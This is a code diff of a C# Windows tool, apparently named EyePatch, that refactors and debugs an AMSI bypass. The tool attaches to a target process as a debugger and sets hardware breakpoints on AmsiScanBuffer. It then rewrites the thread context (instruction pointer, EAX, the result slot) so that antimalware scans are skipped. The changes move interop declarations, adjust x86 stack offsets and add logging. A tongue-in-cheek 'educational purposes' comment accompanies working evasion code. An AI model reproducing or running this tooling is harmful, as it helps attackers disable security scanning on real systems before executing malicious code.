@@ -8,442 +8,35 @@ using System.Runtime.InteropServices;
 using System.Runtime.Remoting.Contexts;
 using System.Text;
 using System.Threading;
-
+using static EyePatch.Patch.Native;
 namespace EyePatch.Patch
 {
 
 
 
-    // Main logic HardwareBreakpoint for amsi made by https://github.com/AceYonca    educational purposes of course ;3
+    // Main logic HardwareBreakpoint for Amsi made by https://github.com/AceYonca    educational purposes of course ;3
     internal static class HardwareBreakpoint
     {
-
-
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        private static extern IntPtr LoadLibrary(string lpFileName);
-
-        private const string Kernel32 = "kernel32.dll";
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool ReadProcessMemory(
-            IntPtr hProcess,
-            IntPtr lpBaseAddress,
-            [Out] byte[] lpBuffer,
-            int dwSize,
-            out IntPtr lpNumberOfBytesRead);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool WriteProcessMemory(
-            IntPtr hProcess,
-            IntPtr lpBaseAddress,
-            byte[] lpBuffer,
-            int nSize,
-            out IntPtr lpNumberOfBytesWritten);
-
-        [DllImport(Kernel32, SetLastError = true, CharSet = CharSet.Ansi)]
-        private static extern IntPtr LoadLibraryA(string lpFileName);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool FreeLibrary(IntPtr hModule);
-
-        [DllImport(Kernel32, SetLastError = true, CharSet = CharSet.Ansi)]
-        private static extern IntPtr GetProcAddress(
-            IntPtr hModule,
-            string procName);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool DebugActiveProcess(uint dwProcessId);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool DebugActiveProcessStop(uint dwProcessId);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool WaitForDebugEvent(
-            out DEBUG_EVENT lpDebugEvent,
-            uint dwMilliseconds);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool ContinueDebugEvent(
-            uint dwProcessId,
-            uint dwThreadId,
-            uint dwContinueStatus);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern IntPtr OpenThread(
-            uint dwDesiredAccess,
-            bool bInheritHandle,
-            uint dwThreadId);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool CloseHandle(IntPtr hObject);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern uint SuspendThread(IntPtr hThread);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern uint ResumeThread(IntPtr hThread);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool IsWow64Process(
-            IntPtr hProcess,
-            out bool wow64Process);
-
-        // x64 context
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool GetThreadContext(
-            IntPtr hThread,
-            ref CONTEXT64 lpContext);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool SetThreadContext(
-            IntPtr hThread,
-            ref CONTEXT64 lpContext);
-
-        // native x86 context
-        [DllImport(Kernel32, SetLastError = true, EntryPoint = "GetThreadContext")]
-        private static extern bool GetThreadContext32(
-            IntPtr hThread,
-            ref CONTEXT32 lpContext);
-
-        [DllImport(Kernel32, SetLastError = true, EntryPoint = "SetThreadContext")]
-        private static extern bool SetThreadContext32(
-            IntPtr hThread,
-            ref CONTEXT32 lpContext);
-
-        // WOW64 x86 context from x64 debugger
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool Wow64GetThreadContext(
-            IntPtr hThread,
-            ref CONTEXT32 lpContext);
-
-        [DllImport(Kernel32, SetLastError = true)]
-        private static extern bool Wow64SetThreadContext(
-            IntPtr hThread,
-            ref CONTEXT32 lpContext);
-
-
-        private static CONTEXT64 CreateContext()
-        {
-            return new CONTEXT64
-            {
-                ContextFlags = CONTEXT_FLAGS.CONTEXT_ALL_NEEDED,
-
-                FltSave = new XSAVE_FORMAT64
-                {
-                    FloatRegisters = new M128A[8],
-                    XmmRegisters = new M128A[16],
-                    Reserved4 = new byte[96]
-                },
-
-                VectorRegister = new M128A[26]
-            };
-        }
-
-
-        private static CONTEXT32 CreateContext32()
-        {
-            return new CONTEXT32
-            {
-                ContextFlags = CONTEXT32_ALL_NEEDED,
-                FloatSave = new FLOATING_SAVE_AREA
-                {
-                    RegisterArea = new byte[80]
-                },
-                ExtendedRegisters = new byte[512]
-            };
-        }
-
-
-        // =========================
-        // Constants
-        // =========================
-
-        private const uint DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
-        private const uint DBG_CONTINUE = 0x00010002;
-
-        private const uint EXCEPTION_SINGLE_STEP = 0x80000004;
-        private const uint EXCEPTION_BREAKPOINT = 0x80000003;
-
-        private const uint WAIT_TIMEOUT = 121;
-        private const uint INFINITE = 0xFFFFFFFF;
-
-        private const uint THREAD_SUSPEND_RESUME = 0x0002;
-        private const uint THREAD_GET_CONTEXT = 0x0008;
-        private const uint THREAD_SET_CONTEXT = 0x0010;
-        private const uint THREAD_QUERY_INFORMATION = 0x0040;
-
-        private const uint CONTEXT_i386 = 0x00010000;
-        private const uint CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x00000010;
-
-
-        private const uint CONTEXT_SEGMENTS = CONTEXT_i386 | 0x00000004;
-        private const uint CONTEXT_CONTROL = CONTEXT_i386 | 0x00000001;
-        private const uint CONTEXT_INTEGER = CONTEXT_i386 | 0x00000002;
-
-        private const uint CONTEXT32_ALL_NEEDED =
-            CONTEXT_CONTROL |
-            CONTEXT_INTEGER |
-            CONTEXT_SEGMENTS |
-            CONTEXT_DEBUG_REGISTERS;
-
-
-
-        // =========================
-        // Debug event structs
-        // =========================
-
-        private enum DebugEventCode : uint
-        {
-            EXCEPTION_DEBUG_EVENT = 1,
-            CREATE_THREAD_DEBUG_EVENT = 2,
-            CREATE_PROCESS_DEBUG_EVENT = 3,
-            EXIT_THREAD_DEBUG_EVENT = 4,
-            EXIT_PROCESS_DEBUG_EVENT = 5,
-            LOAD_DLL_DEBUG_EVENT = 6,
-            UNLOAD_DLL_DEBUG_EVENT = 7,
-            OUTPUT_DEBUG_STRING_EVENT = 8,
-            RIP_EVENT = 9
-        }
-
-
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct DEBUG_EVENT
-        {
-            public uint dwDebugEventCode;
-            public uint dwProcessId;
-            public uint dwThreadId;
-            public DEBUG_EVENT_UNION u;
-        }
-
-        [StructLayout(LayoutKind.Explicit)]
-        private struct DEBUG_EVENT_UNION
-        {
-            [FieldOffset(0)]
-            public EXCEPTION_DEBUG_INFO Exception;
-
-            [FieldOffset(0)]
-            public EXIT_PROCESS_DEBUG_INFO ExitProcess;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct EXIT_PROCESS_DEBUG_INFO
-        {
-            public uint dwExitCode;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct EXCEPTION_DEBUG_INFO
-        {
-            public EXCEPTION_RECORD ExceptionRecord;
-            public uint dwFirstChance;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct EXCEPTION_RECORD
-        {
-            public uint ExceptionCode;
-            public uint ExceptionFlags;
-            public IntPtr ExceptionRecord;
-            public IntPtr ExceptionAddress;
-            public uint NumberParameters;
-
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
-            public IntPtr[] ExceptionInformation;
-        }
-
-        // =========================
-        // x64 CONTEXT
-        // =========================
-
-        [Flags]
-        private enum CONTEXT_FLAGS : uint
-        {
-            CONTEXT_AMD64 = 0x00100000,
-            CONTEXT_CONTROL = CONTEXT_AMD64 | 0x00000001,
-            CONTEXT_INTEGER = CONTEXT_AMD64 | 0x00000002,
-            CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x00000010,
-
-            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER,
-            CONTEXT_ALL_NEEDED = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_DEBUG_REGISTERS
-        }
-
-        [StructLayout(LayoutKind.Sequential, Pack = 16)]
-        private struct M128A
-        {
-            public ulong Low;
-            public long High;
-        }
-
-        [StructLayout(LayoutKind.Sequential, Pack = 16)]
-        private struct XSAVE_FORMAT64
-        {
-            public ushort ControlWord;
-            public ushort StatusWord;
-            public byte TagWord;
-            public byte Reserved1;
-            public ushort ErrorOpcode;
-            public uint ErrorOffset;
-            public ushort ErrorSelector;
-            public ushort Reserved2;
-            public uint DataOffset;
-            public ushort DataSelector;
-            public ushort Reserved3;
-            public uint MxCsr;
-            public uint MxCsr_Mask;
-
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
-            public M128A[] FloatRegisters;
-
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
-            public M128A[] XmmRegisters;
-
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
-            public byte[] Reserved4;
-        }
-
-        [StructLayout(LayoutKind.Sequential, Pack = 16)]
-        private struct CONTEXT64
-        {
-            public ulong P1Home;
-            public ulong P2Home;
-            public ulong P3Home;
-            public ulong P4Home;
-            public ulong P5Home;
-            public ulong P6Home;
-
-            public CONTEXT_FLAGS ContextFlags;
-            public uint MxCsr;
-
-            public ushort SegCs;
-            public ushort SegDs;
-            public ushort SegEs;
-            public ushort SegFs;
-            public ushort SegGs;
-            public ushort SegSs;
-            public uint EFlags;
-
-            public ulong Dr0;
-            public ulong Dr1;
-            public ulong Dr2;
-            public ulong Dr3;
-            public ulong Dr6;
-            public ulong Dr7;
-
-            public ulong Rax;
-            public ulong Rcx;
-            public ulong Rdx;
-            public ulong Rbx;
-            public ulong Rsp;
-            public ulong Rbp;
-            public ulong Rsi;
-            public ulong Rdi;
-            public ulong R8;
-            public ulong R9;
-            public ulong R10;
-            public ulong R11;
-            public ulong R12;
-            public ulong R13;
-            public ulong R14;
-            public ulong R15;
-
-            public ulong Rip;
-
-            public XSAVE_FORMAT64 FltSave;
-
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
-            public M128A[] VectorRegister;
-
-            public ulong VectorControl;
-
-            public ulong DebugControl;
-            public ulong LastBranchToRip;
-            public ulong LastBranchFromRip;
-            public ulong LastExceptionToRip;
-            public ulong LastExceptionFromRip;
-        }
-
-        // =========================
-        // x86 CONTEXT
-        // =========================
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct FLOATING_SAVE_AREA
-        {
-            public uint ControlWord;
-            public uint StatusWord;
-            public uint TagWord;
-            public uint ErrorOffset;
-            public uint ErrorSelector;
-            public uint DataOffset;
-            public uint DataSelector;
-
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
-            public byte[] RegisterArea;
-
-            public uint Cr0NpxState;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct CONTEXT32
-        {
-            public uint ContextFlags;
-
-            public uint Dr0;
-            public uint Dr1;
-            public uint Dr2;
-            public uint Dr3;
-            public uint Dr6;
-            public uint Dr7;
-
-            public FLOATING_SAVE_AREA FloatSave;
-
-            public uint SegGs;
-            public uint SegFs;
-            public uint SegEs;
-            public uint SegDs;
-
-            public uint Edi;
-            public uint Esi;
-            public uint Ebx;
-            public uint Edx;
-            public uint Ecx;
-            public uint Eax;
-
-            public uint Ebp;
-            public uint Eip;
-            public uint SegCs;
-            public uint EFlags;
-            public uint Esp;
-            public uint SegSs;
-
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
-            public byte[] ExtendedRegisters;
-        }
-
 
         private static Process _targetProcess;
         private static IntPtr _breakpointAddress;
         private static volatile bool _debugLoopRunning;
 
 
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool IsWow64Process2(
-    IntPtr hProcess,
-    out ushort processMachine,
-    out ushort nativeMachine);
-
-        private const ushort IMAGE_FILE_MACHINE_UNKNOWN = 0x0000;
-        private const ushort IMAGE_FILE_MACHINE_I386 = 0x014c;
-        private const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
-
-        private static bool _verboseDebugLogs = false;
-
-
-        private const uint STATUS_WX86_SINGLE_STEP = 0x4000001E;
-
-
+        public static CONTEXT64 CreateContext()
+        {
+            return new CONTEXT64
+            {
+                ContextFlags = CONTEXT_FLAGS.CONTEXT_ALL_NEEDED,
+                FltSave = new XSAVE_FORMAT64
+                {
+                    FloatRegisters = new M128A[8],
+                    XmmRegisters = new M128A[16],
+                    Reserved4 = new byte[96]
+                },
+                VectorRegister = new M128A[26]
+            };
+        }
 
         private static bool IsProcess64Bit(Process process)
         {
@@ -723,7 +316,7 @@ namespace EyePatch.Patch
 
             IntPtr AmsiBufferAddress = ResolveRemoteExport(
                 _targetProcess,
-                "Amsi.dll",
+                "amsi.dll",
                 "AmsiScanBuffer");
 
             _breakpointAddress = AmsiBufferAddress;
@@ -1175,6 +768,10 @@ namespace EyePatch.Patch
         private static bool _targetIsWow64;
         private static bool HandleBreakpoint32(IntPtr hThread)
         {
+            LogMessage("HandleBreakpoint32 entered.");
+
+
+
             CONTEXT32 context = CreateContext32();
 
             bool gotContext = _targetIsWow64
@@ -1196,7 +793,8 @@ namespace EyePatch.Patch
             if (!IsCanonicalUserAddress32(returnAddress))
                 return false;
 
-            uint resultSlot = context.Esp + 24u;
+            uint resultSlot = context.Esp + 16u;
+
 
             uint resultAddress = ReadUInt32Remote(
                 hProcess,
@@ -1219,10 +817,23 @@ namespace EyePatch.Patch
                 return false;
             }
 
+            for (uint i = 0; i < 8; i++)
+            {
+                uint slot = context.Esp + i * 4;
+                uint value = ReadUInt32Remote(hProcess, new IntPtr(unchecked((int)slot)));
+                LogMessage($"x86 [ESP+{i * 4}] = 0x{value:X8}");
+            }
+
+
+
+
             context.Eip = returnAddress;
             context.Esp += 4;
             context.Eax = 0;
             context.Dr6 = 0;
+
+
+
 
 
             bool setContext = _targetIsWow64
@@ -1406,7 +1017,7 @@ namespace EyePatch.Patch
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
 
-     
+
 
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
         private struct MODULEENTRY32
@@ -1551,8 +1162,12 @@ namespace EyePatch.Patch
                 foreach (uint threadId in _patchedThreads.ToList())
                 {
                     IntPtr hThread = OpenThread(
-                        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
-                        false,
+THREAD_GET_CONTEXT |
+THREAD_SET_CONTEXT |
+THREAD_SUSPEND_RESUME |
+THREAD_QUERY_INFORMATION ,
+
+false,
                         threadId);
 
                     if (hThread == IntPtr.Zero)
@@ -1573,13 +1188,7 @@ namespace EyePatch.Patch
 
                             if (Wow64GetThreadContext(hThread, ref context))
                             {
-                                context.Dr0 = 0;
-                                context.Dr1 = 0;
-                                context.Dr2 = 0;
-                                context.Dr3 = 0;
-                                context.Dr6 = 0;
-                                context.Dr7 = 0;
-
+                                DisableBreakpoint32(ref context, 0);
                                 Wow64SetThreadContext(hThread, ref context);
                             }
                         }
@@ -1589,13 +1198,7 @@ namespace EyePatch.Patch
 
                             if (GetThreadContext(hThread, ref context))
                             {
-                                context.Dr0 = 0;
-                                context.Dr1 = 0;
-                                context.Dr2 = 0;
-                                context.Dr3 = 0;
-                                context.Dr6 = 0;
-                                context.Dr7 = 0;
-
+                                DisableBreakpoint64(ref context, 0);
                                 SetThreadContext(hThread, ref context);
                             }
                         }
